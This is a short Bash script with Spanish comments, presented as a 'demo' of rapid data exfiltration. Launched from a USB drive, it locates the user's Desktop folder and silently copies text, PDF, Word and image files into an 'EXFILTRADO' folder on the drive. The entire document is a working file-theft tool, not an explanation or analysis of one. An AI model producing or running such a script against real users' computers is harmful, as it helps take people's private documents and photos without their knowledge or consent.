#!/bin/bash
echo "========================================="
echo " 🚨 DEMO: Exfiltracion Rapida de Datos 🚨"
echo "========================================="
echo

# Detectar la ruta donde está el script (el USB)
usbdrive="$(dirname "$(realpath "$0")")"

# Carpeta destino dentro del USB
destino="$usbdrive/EXFILTRADO"
mkdir -p "$destino"

# Carpeta Escritorio del usuario actual
escritorio="$HOME/Escritorio"
if [ ! -d "$escritorio" ]; then
  escritorio="$HOME/Desktop"
fi

echo "Buscando archivos en: $escritorio"

# Copiar archivos comunes de documentos
cp -v "$escritorio"/*.txt "$destino" 2>/dev/null
cp -v "$escritorio"/*.pdf "$destino" 2>/dev/null
cp -v "$escritorio"/*.docx "$destino" 2>/dev/null
cp -v "$escritorio"/*.jpg "$destino" 2>/dev/null
cp -v "$escritorio"/*.png "$destino" 2>/dev/null

echo
echo "Archivos copiados en: $destino"
echo "🚨 DEMO COMPLETADA 🚨"
